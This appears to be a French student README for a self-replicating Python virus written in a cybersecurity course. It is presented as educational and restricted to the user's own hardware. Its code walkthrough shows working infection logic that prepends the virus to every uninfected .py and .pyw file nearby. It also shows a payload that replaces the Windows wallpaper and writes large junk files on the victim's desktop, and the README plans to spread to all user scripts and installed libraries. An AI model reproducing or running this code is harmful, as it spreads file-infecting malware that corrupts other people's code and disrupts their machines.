![Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/f/f8/Python_logo_and_wordmark.svg/2560px-Python_logo_and_wordmark.svg.png)

**Python-virus** est un projet issu d'un cours d'1,5 jours. Il s'agit d'un virus s'auto répliquant pour assurer sa pérénité. 

> **Il s'agit d'un programme à portée éducative uniquement et ne doit être utilisé que comme tel sur du matériel appartenant à l'utilisateur.**

# Description du projet
> "*On n'est jamais qu'à 5 poignées de mains du Pape !*"

Le virus fonctionne en transportant et/ou exécutant une charge virale s'injectant dans tout autre fichier Python environnant qui n'a pas déjà été infecté. Ainsi, les fichiers nouvellement infectés exécuteront la charge virale tout en servant de rebond pour en infecter d'autres.

## Etat d'avancement du projet

- [x] Détermination de l'état d'inféction actuel d'un fichier
- [x] Propagation aux fichiers Python environnants pas encore infectés
- [X] Mise en place du payload
- [X] **Payload**: changement du fond d'écran
- [X] **Payload**: embedder l'image en base64 dans le script
- [X] **Payload**: création de fichiers non désirés sur le bureau
- [ ] Mise en place d'un mode "infection uniquement" n'exécutant **pas** le payload
- [ ] Gestion des mises à jour du code malveillant
- [ ] Infection de l'intégralité des scripts Python de l'utilisateur
- [ ] Infection de l'intégralité des bibliothèques Python installées
- [ ] Infection des bibliothèques Python installées dans l'environnement virtuel d'exécution

## Dépendances du projet
Ce programme ne repose que sur des bibliothèques Python 3 de base. Il conviendra d'importer les bibliothèques nécessaires au bon fonctionnement du payload. 

# Utilisation
## Prérequis
### Préparation de l'environnement de travail
Il est fortement recommandé d'exécuter ce programme dans une machine virtuelle.

- Création d'un environnement virtuel: ```python -m venv env```

- Activation de cet environnement virtuel: ```./env/Scripts/activate```

## Exécution

Le programme s'exécute en saisissant ```python virus.py```.

Si l'exécution fonctionne, le payload s'exécute (amélioration à venir) et le virus se réplique sur les fichiers ```.py``` et ```.pyw``` environnants.

# Déconstruction du code

```python 
with open(sys.argv[0], 'r') as f:
    virusLines = f.readlines()
``` 
> Ouvre le fichier actuellement exécuté et imprime son contenu dans la variable ```virusLines```

```python 
isInfected = False
for eachLine in virusLines:
    if eachLine == "#start":
        isInfected = True
    if not isInfected:
        virusCode.append(eachLine)
    if eachLine == "#stop":
        break 
```
> Lit chaque ligne de la variable ```virusLines``` correspondant au fichier ouvert. Si la ligne actuelle est égale au délimiteur de début ```#start```, le code détermine que le fichier a déjà été infecté et ne fait plus rien jusqu'à atteindre la ligne contenant le délimiteur de fin  ```#stop```. Si le fichier ne contient pas ```#start``` il  n'est alors pas considéré comme infecté, et on ajoute à un tableau ```virusCode``` le contenu entre les délimiteurs.



```python
otherPythonFiles = glob.glob('*.py') + glob.glob('*.pyw')
isInfected = False
for eachFile in otherPythonFiles:
    with open(eachFile, 'r') as f:
        originalCode = f.readlines()
    isInfected = False
    for line in originalCode:
        if line == "#start\n":
            isInfected = True
            break
    if not isInfected:
        fullHackedCode = []
        fullHackedCode.extend(virusCode)
        fullHackedCode.extend('\n')
        fullHackedCode.extend(originalCode)
        with open(eachFile, 'w') as f:
            f.writelines(fullHackedCode)
```
> Pour chaque fichier Python environnant trouvé par le module ```glob```, on imprime son contenu dans la variable ```originalCode```, puis on cherche la présence du délimiteur de début en première ligne du fichier ouvert. Si on le trouve, on ne fait rien car le fichier est déjà infecté; sinon on remplace son  contenu par la variable ```fullHackedCode``` qui est un tableau contenant respectivement: le code du virus, un retour chariot, le code originel. Le fichier Python nouvellement infecté reste donc fonctionnel mais exécutera une charge virale ET se propagera à son tour aux fichiers Python environnants.

```python
wallpaperPath = os.path.abspath("pwned.jpg")
ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaperPath , 0)
   
x = 1
pathToInfect = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))
for i in range(x):
    file = open(pathToInfect+"\pwned!_%d.txt" % i, "w")
    num_chars = 3125000
    file.write("Votre PC à été infécté par un étudiant de l'IPSSI :) profitez de ces " + str(x) + " fichiers d'environ 500 Mo! \n\n")
    file.write(''.join(random.choice('0123456789ABCDEF') for i in range(16)) * num_chars)
    file.close()
```
> Changement du fond d'écran par le fichier stocké dans ```pwned.jpg```, et création de ```x``` fichiers sur le bureau de la victime, faisant 50 Mo chacun.

# Crédits
## Auteur

Par François B, étudiant à l'école IPSSI en première année de master Cybersécurité & cloud-computing

Merci à Christian A, enseignants chercheurs

## Licence

Ce programme a été créé dans un but purement éducatif et n'est soumis en tant que tel à aucune licence.
Les licences des bibliothèques et interprêteurs utilisés s'appliquent.


